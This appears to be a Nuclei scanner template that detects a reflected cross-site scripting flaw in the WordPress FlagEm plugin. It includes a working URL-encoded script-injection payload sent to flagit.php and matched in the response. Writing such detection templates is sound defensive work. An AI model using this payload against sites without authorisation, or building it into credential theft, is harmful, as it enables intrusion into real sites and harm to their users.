flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - /wp-content/plugins/FlagEm/
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: wp-flagem-xss
info:
  author: daffainfo
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: WordPress FlagEm plugin contains a cross-site scripting vulnerability.
    An attacker can execute arbitrary script in the browser of an unsuspecting user
    in the context of the affected site. This can allow the attacker to steal cookie-based
    authentication credentials and launch other attacks.
  metadata:
    max-request: 2
  name: WordPress FlagEm - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/38674
  - https://vulners.com/packetstorm/PACKETSTORM:122505
  severity: high
  tags: wordpress,xss,wp-plugin,edb,vuln
